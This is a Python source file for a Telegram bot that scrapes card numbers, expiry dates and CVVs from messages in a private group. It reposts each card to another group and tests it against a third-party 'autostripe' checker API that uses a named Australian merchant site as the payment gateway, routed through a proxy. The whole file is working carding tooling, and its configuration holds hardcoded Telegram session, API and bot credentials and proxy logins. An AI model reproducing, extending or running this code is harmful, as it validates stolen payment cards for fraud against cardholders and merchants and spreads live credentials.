import re
import aiohttp
import asyncio
import random
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Bot
from telegram.helpers import escape_markdown
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ---------------- CONFIG ----------------
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"

PRIVATE_GROUP_ID = -1002682944548
TARGET_GROUP_ID = -1002968335063
ADMIN_ID = 8493360284

SITE = "buildersdiscountwarehouse.com.au"
API_BASE = "https://darkboy-auto-stripe-y6qk.onrender.com"

PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]
NUM_CONCURRENT = 5  # simultaneous API requests

# ---------------- CARD REGEX ----------------
# Matches cards with optional separators, CVV, expiry, and names
CARD_REGEX = re.compile(
    r"""
    (?P<cc>\d{13,16})            # Card number
    (?:[\s|:/\\]+)?               # Optional separator
    (?P<exp_month>\d{2})?         # Optional month
    (?:[\s|:/\\]+)?               # Optional separator
    (?P<exp_year>\d{2,4})?        # Optional year
    (?:[\s|:/\\]+)?               # Optional separator
    (?P<cvv>\d{3,4})?             # Optional CVV
    """,
    re.VERBOSE | re.MULTILINE
)

# ---------------- CLIENTS ----------------
user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
bot_client = Bot(token=BOT_TOKEN)
session: aiohttp.ClientSession = None
dropping_enabled = False

# ---------------- SEMAPHORE ----------------
semaphore = asyncio.Semaphore(NUM_CONCURRENT)

# ---------------- FUNCTIONS ----------------
async def check_card_and_update(msg_obj, card: str):
    """Check card via API and update Telegram message"""
    global session
    async with semaphore:
        proxy = random.choice(PROXIES)
        url = f"{API_BASE}/gateway=autostripe/key=darkboy/site={SITE}/cc={card}"

        try:
            async with session.get(url, timeout=15) as resp:
                data = await resp.json()
        except Exception as e:
            data = {"response": f"API Error: {e}", "status": "Error"}

        response = escape_markdown(str(data.get("response")), version=2)
        status = escape_markdown(str(data.get("status")), version=2)

        new_text = msg_obj.text + f"\n\n📊 Checked Result:\nStatus: {status}\nResponse: {response}"
        try:
            await msg_obj.edit_text(new_text, parse_mode="MarkdownV2")
            print(f"[✓] Updated: {card} -> {status}")
        except Exception as e:
            print(f"[❌] Failed to update: {card} -> {e}")

async def drop_card(card: str):
    """Send card immediately, then process API"""
    global dropping_enabled
    if not dropping_enabled:
        print(f"[i] Dropping disabled: {card}")
        return

    try:
        msg_obj = await bot_client.send_message(
            chat_id=TARGET_GROUP_ID,
            text=f"💳 CC Detected: `{escape_markdown(card, version=2)}`",
            parse_mode="MarkdownV2"
        )
        print(f"[+] Dropped: {card}")
        asyncio.create_task(check_card_and_update(msg_obj, card))
    except Exception as e:
        print(f"[❌] Failed to drop: {card} -> {e}")

def extract_cards(text: str):
    """Extract all possible cards from messy text"""
    matches = CARD_REGEX.finditer(text)
    cards = []
    for m in matches:
        parts = [m.group("cc")]
        if m.group("exp_month") and m.group("exp_year"):
            parts.append(m.group("exp_month"))
            parts.append(m.group("exp_year"))
        if m.group("cvv"):
            parts.append(m.group("cvv"))
        cards.append("|".join(parts))
    return cards

# ---------------- TELETHON EVENT ----------------
@user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def card_listener(event):
    text = event.message.message
    if not text:
        return
    cards = extract_cards(text)
    if cards:
        for card_str in cards:
            asyncio.create_task(drop_card(card_str))
            print(f"[+] Card detected and processing: {card_str}")

# ---------------- TELEGRAM COMMANDS ----------------
async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
        return
    await context.bot.send_message(update.effective_chat.id, "✅ Send /drop to start dropping checked CC")

async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id != ADMIN_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
        return
    dropping_enabled = True
    await context.bot.send_message(update.effective_chat.id, "✅ Dropping enabled!")

async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id != ADMIN_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
        return
    dropping_enabled = False
    await context.bot.send_message(update.effective_chat.id, "⏹ Dropping stopped.")

# ---------------- MAIN ----------------
async def main():
    global session
    session = aiohttp.ClientSession()

    await user_client.start()
    print("✅ Telethon client started")

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("drop", drop))
    app.add_handler(CommandHandler("stop", stop))
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("✅ Telegram bot started. Waiting for admin commands...")

    await user_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
